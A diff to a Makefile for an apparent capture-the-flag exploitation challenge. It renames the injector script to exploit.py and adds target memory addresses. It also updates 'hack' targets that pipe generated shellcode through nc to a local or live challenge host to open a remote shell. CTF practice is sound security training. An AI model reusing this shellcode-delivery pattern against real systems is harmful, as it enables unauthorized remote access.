@@ -2,7 +2,10 @@
 Q = $(if $(filter 1,$V),,@)
 CAPTION = $(if $(filter 1,$V),echo,printf)
 
+LIVE_ADDR = 0x804c0c0
 LIVE_HOST = shutdown.tamagodzilla.lol
+
+TARGET_ADDR = 0x4040c0
 TARGET_HOST = localhost
 TARGET_PORT = 1337
 
@@ -67,21 +70,21 @@ connect: ## Connects with the target
 
 .PHONY: connect-live
 connect-live: ## Connects with the target (live challenge)
-	@$(MAKE) TARGET_HOST=$(LIVE_HOST) connect
+	@$(MAKE) TARGET_HOST=$(LIVE_HOST) TARGET_ADDR=$(LIVE_ADDR) connect
 
 ## Hack:
 .PHONY: hack
-hack: shellcode.bin injector.py ## Injects, executes shellcode on the target, opens shell access
+hack: shellcode.bin exploit.py ## Injects, executes shellcode on the target, opens shell access
 	@$(CAPTION) "Verifying shellcode ${YELLOW}$<${RESET}... "
-	$Q python3 injector.py -c $<
+	$Q python3 exploit.py -c $<
 	@echo "${BOLD}${GREEN}OK!${RESET}"
 
-	@echo "Hacking into ${YELLOW}$(TARGET_HOST):$(TARGET_PORT)${RESET} with ${CYAN}$<${RESET} payload..."
-	$Q cat <(python3 injector.py $<) - | nc $(TARGET_HOST) $(TARGET_PORT) || echo "${RED}Connection terminated${RESET}"
+	@echo "Hacking into ${YELLOW}$(TARGET_HOST):$(TARGET_PORT)${RESET} with ${CYAN}$<${RESET} @ ${CYAN}$(TARGET_ADDR)${RESET} payload..."
+	$Q cat <(python3 exploit.py $< $(TARGET_ADDR)) - | nc $(TARGET_HOST) $(TARGET_PORT) || echo "${RED}Connection terminated${RESET}"
 
 .PHONY: hack-live
-hack-live: shellcode.bin injector.py ## Injects, executes shellcode on the target, opens shell access (live challenge)
-	@$(MAKE) TARGET_HOST=$(LIVE_HOST) hack
+hack-live: shellcode.bin exploit.py ## Injects, executes shellcode on the target, opens shell access (live challenge)
+	@$(MAKE) TARGET_HOST=$(LIVE_HOST) TARGET_ADDR=$(LIVE_ADDR) hack
 
 
 ## Cleanup:
